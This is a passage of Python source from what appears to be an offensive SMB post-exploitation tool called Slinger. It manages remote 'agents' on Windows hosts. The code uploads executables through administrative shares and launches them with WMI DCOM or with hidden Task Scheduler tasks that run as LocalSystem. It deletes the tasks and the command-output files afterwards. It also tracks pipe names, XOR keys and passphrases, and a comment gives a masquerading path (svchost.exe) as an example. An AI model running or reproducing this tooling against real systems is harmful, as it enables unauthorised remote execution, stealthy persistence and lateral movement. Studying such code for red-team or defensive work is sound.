                    result = self._start_agent_process(full_path, method=method, args=args)

                    if result.get("success", False):
                        print_good("✓ Agent started successfully")
                        process_id = result.get("process_id")
                        if process_id:
                            print_good(f"✓ Agent PPID: {process_id} (parent process)")
                        agent_status = "running"
                    else:
                        print_bad(f"Failed to start agent: {result.get('error', 'Unknown error')}")
                        print_info("Agent uploaded but not started - you may start it manually")
                        agent_status = "uploaded"

                # Always save agent info to registry (even if start failed)
                agent_info = {
                    "id": agent_id,
                    "name": agent_name,
                    "host": self.host,
                    "path": full_path,
                    "share_name": self.share,
                    "share_path": share_disk_path,
                    "pipe_name": pipe_name,
                    "xor_key": xor_key,
                    "passphrase": passphrase,
                    "auth_enabled": auth_enabled,
                    "process_id": process_id,
                    "deployed_at": str(datetime.datetime.now()),
                    "status": agent_status,
                    "on_disk": "Present",  # Just uploaded successfully
                    "last_checked": None,
                }

                # Save agent info to local registry
                self._save_agent_info(agent_info)

                print_good(f"✓ Agent registered with ID: {agent_id}")
                print_info(f"Agent file: {agent_name}")
                print_info(f"Agent path: {full_path}")

                # Show pipe name source
                if pipe_source == "flag":
                    print_info(f"Pipe name: {pipe_name} (from --pipe flag)")
                elif pipe_source == "registry":
                    print_info(f"Pipe name: {pipe_name} (from build registry)")
                else:
                    print_info(f"Pipe name: {pipe_name} (placeholder - will be discovered)")

                print_info(f"Named pipe: \\\\{self.host}\\pipe\\{pipe_name}")
                if agent_status == "running":
                    print_warning(f"Use 'agent use {agent_id}' to interact with this agent")
                else:
                    print_warning(f"Use 'agent start {agent_id}' to start this agent")
                print_info(f"Use 'agent list' to see all deployed agents")

            except Exception as e:
                print_bad(f"Failed to upload agent: {e}")
                return

        except Exception as e:
            print_bad(f"Agent deployment failed: {e}")
            print_debug(f"Exception details: {e}")

    def _resolve_share_path(self, share_name):
        """Resolve share name to its disk path using SMB share enumeration

        Args:
            share_name: Share name (e.g., "C$", "NETLOGON", "SYSVOL")

        Returns:
            Disk path (e.g., "C:\\", "C:\\Windows\\SYSVOL\\sysvol\\htb.local\\SCRIPTS") or None
        """
        try:
            from slingerpkg.utils.printlib import print_debug

            # Query all shares and find matching one
            shares = self.list_shares(ret=True, echo=False)

            for share_info in shares:
                if share_info["name"].upper() == share_name.upper():
                    disk_path = share_info["path"]
                    print_debug(f"Resolved share '{share_name}' to disk path: {disk_path}")
                    return disk_path

            print_debug(f"Could not resolve share '{share_name}' to disk path")
            return None

        except Exception as e:
            print_debug(f"Failed to resolve share path: {e}")
            return None

    def _start_agent_process(self, full_path, method="wmiexec", args=None):
        """Start an agent process using specified method

        Args:
            full_path: Full Windows path to the agent executable (e.g., C:\\agent.exe)
            method: Execution method - 'wmiexec' or 'atexec'
            args: Optional args object with atexec options (ta, td, tf, tn, etc.)

        Returns:
            dict with 'success', 'process_id', 'error' keys
        """
        from slingerpkg.utils.printlib import print_info, print_verbose, print_debug
        from slingerpkg.utils.common import generate_random_string

        if method == "wmiexec":
            print_info("Starting agent via WMI DCOM...")
            command = f'"{full_path}"'
            print_verbose(f"Executing: {command}")

            try:
                result = self.execute_wmi_command(command, capture_output=False, timeout=10)
                return result
            except Exception as e:
                return {"success": False, "error": str(e), "process_id": None}

        elif method == "atexec":
            print_info("Starting agent via Task Scheduler (atexec)...")
            try:
                # Extract atexec options from args or use defaults
                task_name = (
                    getattr(args, "tn", None) or f"SlingerAgent_{generate_random_string(6, 8)}"
                )
                task_folder = getattr(args, "tf", None) or "\\Windows"
                task_author = getattr(args, "ta", None) or "Slinger"
                task_description = getattr(args, "td", None) or "Slinger Task"

                # Create XML for task that just runs the executable (no output capture)
                from slingerpkg.utils.common import generate_random_date, xml_escape

                timestamp = generate_random_date()
                # Run the agent directly, no cmd wrapper needed for executables
                xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>{xml_escape(task_author)}</Author>
        <Description>{xml_escape(task_description)}</Description>
        <URI>\\{xml_escape(task_name)}</URI>
    </RegistrationInfo>
    <Triggers>
        <CalendarTrigger>
            <StartBoundary>{timestamp}</StartBoundary>
            <Enabled>true</Enabled>
            <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
        </CalendarTrigger>
    </Triggers>
    <Principals>
        <Principal id="LocalSystem">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
        <Priority>7</Priority>
    </Settings>
    <Actions Context="LocalSystem">
        <Exec>
            <Command>{xml_escape(full_path)}</Command>
        </Exec>
    </Actions>
</Task>
"""
                # Connect to atsvc pipe
                self.setup_dce_transport()
                self.dce_transport._connect("atsvc")

                # Create the task
                print_verbose(f"Creating task: {task_name}")
                response = self.dce_transport._create_task(task_name, task_folder, xml)
                if response["ErrorCode"] != 0:
                    return {
                        "success": False,
                        "error": f"Failed to create task (error {response['ErrorCode']})",
                        "process_id": None,
                    }

                # Reconnect and run the task
                self.dce_transport._connect("atsvc")
                full_task_path = f"{task_folder}\\{task_name}"
                print_verbose(f"Running task: {full_task_path}")
                response = self.dce_transport._run_task(full_task_path)
                if response["ErrorCode"] != 0:
                    return {
                        "success": False,
                        "error": f"Failed to run task (error {response['ErrorCode']})",
                        "process_id": None,
                    }

                # Reconnect and delete the task
                self.dce_transport._connect("atsvc")
                print_verbose(f"Deleting task: {full_task_path}")
                self.dce_transport._delete_task(full_task_path)

                # Task Scheduler doesn't return PID directly
                return {"success": True, "process_id": None, "error": None}

            except Exception as e:
                print_debug(f"atexec exception: {e}", sys.exc_info())
                return {"success": False, "error": str(e), "process_id": None}

        else:
            return {"success": False, "error": f"Unknown method: {method}", "process_id": None}

    def _execute_via_atexec(self, command, args=None):
        """Execute a command via Task Scheduler (atexec) and capture output

        Args:
            command: Command to execute
            args: Optional args object with atexec options (ta, td, tf, sp, sh, wait, etc.)

        Returns:
            dict with 'success', 'output', 'error' keys
        """
        from slingerpkg.utils.printlib import print_debug, print_verbose
        from slingerpkg.utils.common import (
            generate_random_string,
            generate_random_date,
            xml_escape,
        )
        from time import sleep
        import io
        import sys

        # Extract options from args or use defaults
        task_author = getattr(args, "ta", None) or "Slinger"
        task_description = getattr(args, "td", None) or "Slinger Task"
        task_folder = getattr(args, "tf", None) or "\\Windows"
        save_path = getattr(args, "sp", None) or "\\Users\\Public\\Downloads"
        save_name = getattr(args, "sn", None)
        share_name = getattr(args, "sh", None) or self.share
        wait_time = getattr(args, "wait", None) or 2

        try:
            # Generate random task and output file names
            task_name = getattr(args, "tn", None) or f"SlingerTask_{generate_random_string(6, 8)}"
            output_file = save_name or f"{generate_random_string(8, 10)}.txt"

            # Get share path for output file
            share_info = self.list_shares(args=None, echo=False, ret=True)
            share_path = None
            for share in share_info or []:
                if share["name"].upper() == share_name.upper():
                    share_path = share["path"].rstrip("\\")
                    break

            if not share_path:
                return {"success": False, "output": "", "error": "Could not resolve share path"}

            # Build output path - combine share disk path with save_path
            save_path_clean = save_path.strip("\\")
            if save_path_clean:
                output_path = f"{share_path}\\{save_path_clean}\\{output_file}"
                output_file_relative = f"{save_path_clean}\\{output_file}"
            else:
                output_path = f"{share_path}\\{output_file}"
                output_file_relative = output_file

            # Create XML for task that captures output
            timestamp = generate_random_date()
            escaped_command = xml_escape(f"/C {command} > {output_path} 2>&1")
            xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>{xml_escape(task_author)}</Author>
        <Description>{xml_escape(task_description)}</Description>
        <URI>\\{xml_escape(task_name)}</URI>
    </RegistrationInfo>
    <Triggers>
        <CalendarTrigger>
            <StartBoundary>{timestamp}</StartBoundary>
            <Enabled>true</Enabled>
            <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
        </CalendarTrigger>
    </Triggers>
    <Principals>
        <Principal id="LocalSystem">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
        <Priority>7</Priority>
    </Settings>
    <Actions Context="LocalSystem">
        <Exec>
            <Command>cmd.exe</Command>
            <Arguments>{escaped_command}</Arguments>
        </Exec>
    </Actions>
</Task>
"""
            # Connect to atsvc pipe
            self.setup_dce_transport()
            self.dce_transport._connect("atsvc")

            # Create the task
            print_verbose(f"Creating task: {task_name}")
            response = self.dce_transport._create_task(task_name, task_folder, xml)
            if response["ErrorCode"] != 0:
                return {
                    "success": False,
                    "output": "",
                    "error": f"Failed to create task (error {response['ErrorCode']})",
                }

            # Reconnect and run the task
            self.dce_transport._connect("atsvc")
            full_task_path = f"{task_folder}\\{task_name}"
            print_verbose(f"Running task: {full_task_path}")
            response = self.dce_transport._run_task(full_task_path)
            if response["ErrorCode"] != 0:
                return {
                    "success": False,
                    "output": "",
                    "error": f"Failed to run task (error {response['ErrorCode']})",
                }

            # Reconnect and delete the task
            self.dce_transport._connect("atsvc")
            print_verbose(f"Deleting task: {full_task_path}")
            self.dce_transport._delete_task(full_task_path)

            # Wait for command to complete and read output
            sleep(wait_time)

            # Save current share state
            saved_share = self.share
            saved_tid = self.tid

            try:
                # Connect to the share where output file was written
                if share_name.upper() != self.share.upper():
                    print_debug(f"Switching from {self.share} to {share_name} for file cleanup")
                    self.tid = self.conn.connectTree(share_name)
                    self.share = share_name

                # Read output file using cat method
                # Create a mock args object for cat
                class MockArgs:
                    pass

                cat_args = MockArgs()
                cat_args.remote_path = output_file_relative

                # Capture cat output by redirecting stdout temporarily
                old_stdout = sys.stdout
                sys.stdout = captured_output = io.StringIO()

                try:
                    self.cat(cat_args, echo=False)
                    output_content = captured_output.getvalue()
                finally:
                    sys.stdout = old_stdout

                # Delete output file
                try:
                    print_debug(
                        f"Deleting output file: {output_file_relative} from share {share_name}"
                    )
                    self.delete(output_file_relative)
                    print_debug(f"Successfully deleted: {output_file_relative}")
                except Exception as del_err:
                    print_debug(f"Failed to delete output file {output_file_relative}: {del_err}")

                return {"success": True, "output": output_content, "error": None}
            except Exception as read_error:
                print_debug(f"Failed to read output file: {read_error}")
                return {"success": True, "output": "", "error": None}
            finally:
                # Restore original share state
                if saved_share.upper() != self.share.upper():
                    print_debug(f"Restoring share from {self.share} to {saved_share}")
                    try:
                        self.tid = self.conn.connectTree(saved_share)
                        self.share = saved_share
                    except Exception as restore_err:
                        print_debug(f"Failed to restore share: {restore_err}")

        except Exception as e:
            print_debug(f"atexec exception: {e}", sys.exc_info())
            return {"success": False, "output": "", "error": str(e)}

    def _save_agent_info(self, agent_info):
        """Save agent information to local registry file"""
        try:

            # Create agents directory in user's home
            agents_dir = Path.home() / ".slinger" / "agents"
            agents_dir.mkdir(parents=True, exist_ok=True)

            registry_file = agents_dir / "deployed_agents.json"

            # Load existing registry
            if registry_file.exists():
                with open(registry_file, "r") as f:
                    registry = json.load(f)
            else:
                registry = {}

            # Add new agent
            registry[agent_info["id"]] = agent_info

            # Save updated registry
            with open(registry_file, "w") as f:
                json.dump(registry, f, indent=2)

            print_debug(f"Saved agent info to {registry_file}")

        except Exception as e:
            print_debug(f"Failed to save agent info: {e}")

    def _load_agent_registry(self):
        """Load deployed agents registry"""
        try:

            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if registry_file.exists():
                with open(registry_file, "r") as f:
                    return json.load(f)
            return {}

        except Exception as e:
            print_debug(f"Failed to load agent registry: {e}")
            return {}

    def agent_list_handler(self, args):
        """Handle agent list command"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_log,
                print_debug,
            )
            from tabulate import tabulate

            # Handle delete operation if --del specified
            if hasattr(args, "delete_agent") and args.delete_agent:
                if args.delete_agent.lower() == "all":
                    return self._delete_all_agents_from_registry()
                return self._delete_agent_from_registry(args.delete_agent)

            registry = self._load_agent_registry()

            if not registry:
                print_info("No deployed agents found")
                print_info("Use 'agent deploy' to deploy an agent")
                return

            # Filter by host if specified
            filtered_agents = registry
            if hasattr(args, "host") and args.host:
                filtered_agents = {k: v for k, v in registry.items() if v.get("host") == args.host}

            if not filtered_agents:
                print_info(f"No agents found for host: {args.host}")
                return

            # Get output format
            output_format = getattr(args, "format", "table")

            if output_format == "json":
                # JSON output
                import json

                print(json.dumps(filtered_agents, indent=2))
                return
            elif output_format == "list":
                # List output - one agent per block
                print_info(f"Deployed Agents ({len(filtered_agents)} found):")
                print_log("")
                for agent_id, info in filtered_agents.items():
                    print_log(f"Agent ID: {agent_id}")
                    print_log(f"  Host: {info.get('host', 'Unknown')}")
                    print_log(f"  Name: {info.get('name', 'Unknown')}")
                    print_log(f"  Path: {info.get('path', 'Unknown')}")
                    print_log(f"  PPID: {info.get('process_id', 'Unknown')}")
                    print_log(f"  Status: {info.get('status', 'Unknown')}")
                    print_log(f"  On Disk: {info.get('on_disk', 'Unknown')}")
                    print_log(f"  Deployed At: {info.get('deployed_at', 'Unknown')[:19]}")
                    last_checked = info.get("last_checked")
                    if last_checked:
                        print_log(f"  Last Checked: {last_checked[:19]}")
                    else:
                        print_log(f"  Last Checked: Never")
                    print_log("")
            else:
                # Table output (default)
                headers = [
                    "Agent ID",
                    "Host",
                    "Agent Name",
                    "Path",
                    "PPID",
                    "Status",
                    "On Disk",
                    "Deployed At",
                    "Last Checked",
                ]
                table_data = []

                for agent_id, info in filtered_agents.items():
                    ppid = info.get("process_id", "Unknown")
                    last_checked = info.get("last_checked")
                    if last_checked:
                        last_checked_str = last_checked[:19]
                    else:
                        last_checked_str = "Never"

                    table_data.append(
                        [
                            agent_id,
                            info.get("host", "Unknown"),
                            info.get("name", "Unknown"),
                            info.get("path", "Unknown"),
                            ppid,
                            info.get("status", "Unknown"),
                            info.get("on_disk", "Unknown"),
                            info.get("deployed_at", "Unknown")[:19],  # Trim timestamp
                            last_checked_str,
                        ]
                    )

                print_info(f"Deployed Agents ({len(filtered_agents)} found):")
                print_log(tabulate(table_data, headers=headers, tablefmt="grid"))

            print_info("Commands:")
            print_log("  agent use <id>           - Interact with agent")
            print_log("  agent list --host <host> - Filter by host")
            print_log("  agent list -f json       - Output as JSON")
            print_log("  agent list --del <id>    - Remove agent from registry")
            print_log("  agent list --del all     - Remove all agents from registry")

        except Exception as e:
            print_bad(f"Failed to list agents: {e}")
            print_debug(f"Exception details: {e}")

    def agent_use_handler(self, args):
        """Handle agent interaction via named pipe"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
                print_debug,
            )
            import time

            # Load agent registry to get agent info
            registry = self._load_agent_registry()
            agent_info = registry.get(args.agent_id)

            if not agent_info:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                print_info("Use 'agent list' to see deployed agents")
                return

            print_info(f"Agent Information:")
            print_log(f"  ID: {agent_info['id']}")
            print_log(f"  Host: {agent_info['host']}")
            print_log(f"  Name: {agent_info['name']}")
            print_log(f"  Path: {agent_info['path']}")
            print_log(f"  Pipe: \\\\{agent_info['host']}\\pipe\\{agent_info['pipe_name']}")
            if agent_info.get("process_id"):
                print_log(f"  PPID: {agent_info['process_id']} (parent process)")
            else:
                print_log(f"  PPID: Unknown")

            print_info(f"Connecting to agent: {args.agent_id}")
            print_info(f"Timeout: {args.timeout} seconds")

            # Check if we're connected to the same host
            if self.host != agent_info["host"]:
                print_warning(f"Current session is connected to {self.host}")
                print_warning(f"Agent is on {agent_info['host']}")
                print_info("You may need to connect to the agent's host first")

            # Start interactive agent shell
            print_good(f"Starting interactive session with agent {args.agent_id}")
            print_info(f"Pipe Name: {agent_info['pipe_name']}")
            no_colors = getattr(args, "no_colors", False)
            self._start_agent_shell(agent_info, args.timeout, no_colors=no_colors)

        except Exception as e:
            print_bad(f"Agent interaction failed: {e}")
            print_debug(f"Exception details: {e}")

    def agent_rename_handler(self, args):
        """Handle agent renaming in registry"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if old agent exists
            if args.old not in agents:
                print_bad(f"Agent '{args.old}' not found in registry")
                return

            # Check if new name already exists
            if args.new in agents:
                print_bad(f"Agent '{args.new}' already exists in registry")
                return

            # Rename the agent
            agents[args.new] = agents[args.old]
            agents[args.new]["id"] = args.new
            del agents[args.old]

            # Save updated registry
            with open(registry_file, "w") as f:
                json.dump(agents, f, indent=2)

            print_good(f"Agent renamed from '{args.old}' to '{args.new}'")

        except Exception as e:
            print_bad(f"Failed to rename agent: {e}")

    def agent_check_handler(self, args):
        """Handle agent process status check via WMI"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )

            # Ensure we have a share connection for WMI operations
            if not self.check_if_connected():
                print_bad("Not connected to a share. Please connect to a share first.")
                print_info("Example: use C$")
                return

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            ppid = agent_info.get("process_id")

            if not ppid:
                print_warning(f"No PPID recorded for agent '{args.agent_id}'")
                return

            print_info(f"Checking agent '{args.agent_id}' (PPID: {ppid})")

            # Use WMI to check if the process and its children exist
            try:
                # Query for child processes of the agent's PPID using direct WMI API
                child_query = (
                    f"SELECT ProcessId, Name FROM Win32_Process WHERE ParentProcessId = {ppid}"
                )

                print_debug(f"Executing WMI query: {child_query}")

                # Use the WMI query API directly instead of stdout capture
                try:
                    results = self._run_wql_query(child_query, namespace="root/cimv2")
                    result_count = len(results) if results else 0
                    agent_alive = result_count > 0

                    print_debug(f"WMI query returned {result_count} result(s)")
                except Exception as query_error:
                    print_debug(f"WMI query exception: {query_error}")
                    result_count = 0
                    agent_alive = False

                if agent_alive:
                    print_good(
                        f"✓ Agent process tree is running (PPID: {ppid}) - found {result_count} child process(es)"
                    )

                    # Update agent status to alive if it was previously marked as dead
                    if agents[args.agent_id].get("status") == "dead":
                        agents[args.agent_id]["status"] = "alive"

                elif result_count == 0:
                    print_bad(f"✗ Agent process not found (PPID: {ppid})")
                    print_warning(f"Process has terminated - updating status to 'dead'")

                    # Update agent status to dead
                    agents[args.agent_id]["status"] = "dead"

                else:
                    print_warning(f"Unable to determine agent status from WMI output")
                    print_debug(f"Could not parse WMI results - agent status unchanged")
                    # Show what we actually got for debugging
                    if stdout_output:
                        print_debug(f"Raw output: {stdout_output}")

                # Check if agent file exists on disk
                print_info("Verifying agent file on disk...")
                agent_path = agent_info.get("path")
                agent_name = agent_info.get("name")
                share_path = agent_info.get("share_path")

                if agent_path:
                    # Use wmiexec dcom to check if file exists
                    try:
                        dir_command = f'dir "{agent_path}"'
                        print_debug(f"Checking disk with: {dir_command}")

                        # Use default temp_dir (None) - execute_wmi_command will use current session share
                        # This is share-aware automatically based on where we're currently connected
                        result = self.execute_wmi_command(
                            command=dir_command, capture_output=True, timeout=10, shell="cmd"
                        )

                        if result.get("success"):
                            output = result.get("output", "")
                            # Case-insensitive check for agent filename in output
                            if agent_name.lower() in output.lower():
                                print_good(f"✓ Agent file found on disk: {agent_path}")
                                agents[args.agent_id]["on_disk"] = "Present"
                            else:
                                print_warning(f"✗ Agent file not found on disk: {agent_path}")
                                agents[args.agent_id]["on_disk"] = "Missing"
                        else:
                            print_warning(f"Could not verify file on disk: {result.get('error')}")
                            agents[args.agent_id]["on_disk"] = "Unknown"

                    except Exception as disk_error:
                        print_warning(f"Failed to check disk: {disk_error}")
                        agents[args.agent_id]["on_disk"] = "Unknown"
                else:
                    print_warning("No path recorded for agent - cannot verify disk status")
                    agents[args.agent_id]["on_disk"] = "Unknown"

                # Update last_checked timestamp
                agents[args.agent_id]["last_checked"] = str(datetime.datetime.now())

                # Save updated registry
                with open(registry_file, "w") as f:
                    json.dump(agents, f, indent=2)
                print_good(f"✓ Registry updated for agent '{args.agent_id}'")

            except Exception as e:
                print_bad(f"WMI query failed: {e}")
                print_debug(f"Exception details: {e}")
                print_info("Unable to verify agent status")

        except Exception as e:
            print_bad(f"Failed to check agent: {e}")

    def agent_kill_handler(self, args):
        """Handle agent process termination using specified method"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )
            import re

            # Ensure we're connected to a share
            if not self.check_if_connected():
                print_warning("Not connected to a share - connecting to C$")
                try:
                    self.tid = self.conn.connectTree("C$")
                    self.share = "C$"
                    self.is_connected_to_share = True
                    print_debug("Connected to C$ share")
                except Exception as conn_error:
                    print_bad(f"Failed to connect to C$ share: {conn_error}")
                    return

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            agent_path = agent_info.get("path")

            if not agent_path:
                print_warning(f"No path recorded for agent '{args.agent_id}'")
                return

            # Extract just the executable name from the path
            if "\\" in agent_path:
                exe_name = agent_path.split("\\")[-1]
            else:
                exe_name = os.path.basename(agent_path)

            method = getattr(args, "method", "wmiexec")
            print_info(f"Using {method} method to find and kill agent process: {exe_name}")

            process_ids = []

            try:
                if method == "wmiexec":
                    # Use WMI DCOM to find processes
                    process_query = (
                        f"SELECT ProcessId, Name FROM Win32_Process WHERE Name = '{exe_name}'"
                    )
                    print_debug(f"Executing WMI query: {process_query}")

                    # Force fresh WMI connection
                    if hasattr(self, "_wmi_services"):
                        self._wmi_services.clear()
                    if hasattr(self, "_dcom_connection"):
                        try:
                            if self._dcom_connection:
                                self._dcom_connection.disconnect()
                        except:
                            pass
                        self._dcom_connection = None

                    iWbemServices = self.setup_wmi(namespace="root/cimv2", operation_type="query")
                    iEnumWbemClassObject = iWbemServices.ExecQuery(process_query)

                    while True:
                        try:
                            pEnum = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                            properties = pEnum.getProperties()
                            if "ProcessId" in properties:
                                pid = properties["ProcessId"]["value"]
                                if pid:
                                    process_ids.append(pid)
                        except Exception:
                            break

                elif method == "atexec":
                    # Use tasklist via Task Scheduler to find processes
                    # Get base name without extension for matching
                    exe_base = exe_name.rsplit(".", 1)[0] if "." in exe_name else exe_name

                    # Use findstr to grep for the process name (more reliable than /FI filter)
                    tasklist_cmd = f'tasklist /FO CSV /NH | findstr /I "{exe_base}"'
                    print_debug(f"Executing tasklist: {tasklist_cmd}")

                    result = self._execute_via_atexec(tasklist_cmd, args)

                    if result.get("success"):
                        output = result.get("output", "")
                        print_debug(f"Tasklist output: {repr(output)}")

                        # Parse CSV output: "process.exe","1234","Console","1","10,000 K"
                        for line in output.strip().split("\n"):
                            line = line.strip()
                            if not line or "INFO:" in line.upper():
                                continue
                            # Match PID from CSV format
                            match = re.match(r'"[^"]+","(\d+)"', line)
                            if match:
                                process_ids.append(int(match.group(1)))
                            else:
                                print_debug(f"Line didn't match CSV pattern: {repr(line)}")
                    else:
                        print_bad(f"Failed to get process list: {result.get('error')}")
                        return

            except Exception as query_error:
                print_bad(f"Failed to find processes: {query_error}")
                print_debug(f"Query error details: {query_error}")
                return

            if not process_ids:
                print_warning(f"No running processes found for agent '{args.agent_id}'")
                print_info("Agent may already be terminated")

                agents[args.agent_id]["status"] = "dead"
                with open(registry_file, "w") as f:
                    json.dump(agents, f, indent=2)
                print_good(f"Updated agent '{args.agent_id}' status to 'dead'")
                return

            print_good(f"Found {len(process_ids)} process(es): {process_ids}")

            # Kill each found process using the same method
            for pid in process_ids:
                print_info(f"Terminating process {pid}...")
                kill_command = f"taskkill /F /PID {pid}"

                try:
                    if method == "wmiexec":
                        result = self.execute_wmi_command(
                            command=kill_command,
                            capture_output=True,
                            timeout=10,
                            shell="cmd",
                        )
                    elif method == "atexec":
                        result = self._execute_via_atexec(kill_command, args)

                    if result.get("success"):
                        output = result.get("output", "")
                        print_debug(f"Taskkill output: {output}")

                        if "SUCCESS" in output.upper() or "terminated" in output.lower():
                            print_good(f"✓ Successfully terminated process {pid}")
                        else:
                            print_warning(f"Process {pid} termination status: {output.strip()}")
                    else:
                        print_bad(f"Failed to terminate process {pid}")
                        print_debug(f"Error: {result.get('error')}")

                except Exception as kill_error:
                    print_bad(f"Failed to terminate process {pid}: {kill_error}")
                    print_debug(f"Kill error details: {kill_error}")

            # Update agent status to dead
            agents[args.agent_id]["status"] = "dead"
            with open(registry_file, "w") as f:
                json.dump(agents, f, indent=2)

            print_info(f"Agent '{args.agent_id}' status updated to 'dead'")

        except Exception as e:
            print_bad(f"Failed to kill agent: {e}")

    def agent_restart_handler(self, args):
        """Restart a stopped or crashed agent using its deployment information"""
        try:
            # Check if share is connected
            if not self.check_if_connected():
                return

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            agent_path = agent_info.get("path")

            if not agent_path:
                print_bad(f"No path recorded for agent '{args.agent_id}'")
                return

            print_info(f"Starting agent: {args.agent_id}")
            print_info(f"Executable path: {agent_path}")

            # Get execution method from args (default: wmiexec)
            method = getattr(args, "method", "wmiexec")

            try:
                # Use the unified start method
                result = self._start_agent_process(agent_path, method=method, args=args)

                if result.get("success", False):
                    process_id = result.get("process_id")
                    print_good(f"✓ Agent started successfully")
                    if process_id:
                        print_info(f"  Process ID: {process_id}")

                    # Update process ID in registry
                    agents[args.agent_id]["process_id"] = process_id
                    agents[args.agent_id]["status"] = "running"
                    agents[args.agent_id]["last_restart"] = datetime.datetime.now().isoformat()

                    with open(registry_file, "w") as f:
                        json.dump(agents, f, indent=2)

                    print_info("Registry updated")
                else:
                    error_msg = result.get("error", "Unknown error")
                    print_bad(f"✗ Failed to start agent: {error_msg}")

            except Exception as e:
                print_bad(f"Failed to execute agent: {e}")
                print_debug(f"Exception details: {e}")

        except Exception as e:
            print_bad(f"Failed to start agent: {e}")
            print_debug(f"Exception details: {e}")

    def agent_rm_handler(self, args):
        """Handle agent file removal and registry update"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            agent_path = agent_info.get("path")

            if not agent_path:
                print_warning(f"No path recorded for agent '{args.agent_id}'")
                return

            print_info(f"Attempting to delete agent file: {agent_path}")

            # Use SMB to delete the remote file
            try:
                # Get the share name and path from agent info
                agent_share = agent_info.get("share_name")
                share_path = agent_info.get("share_path")

                if not agent_share:
                    print_warning("No share name recorded for agent - cannot delete via SMB")
                    deletion_success = False
                else:
                    # Build SMB-relative path
                    # Remove the share disk path prefix to get relative path
                    if share_path and agent_path.startswith(share_path):
                        # Path is like: C:\Windows\svchost.exe, share_path is C:\Windows
                        # Relative path should be: svchost.exe
                        relative_path = agent_path[len(share_path) :].lstrip("\\")
                    elif ":" in agent_path and not agent_path[1:].startswith(":\\"):
                        # Handle legacy buggy format like "ADMIN:\svchost.exe"
                        # Extract just the filename
                        print_debug(f"Detected legacy path format: {agent_path}")
                        relative_path = agent_path.split(":", 1)[1].lstrip("\\")
                    else:
                        # Fallback: just use the filename
                        relative_path = os.path.basename(agent_path)

                    print_debug(f"Deleting from share '{agent_share}', path: '{relative_path}'")

                    # Try to delete the file via SMB
                    try:
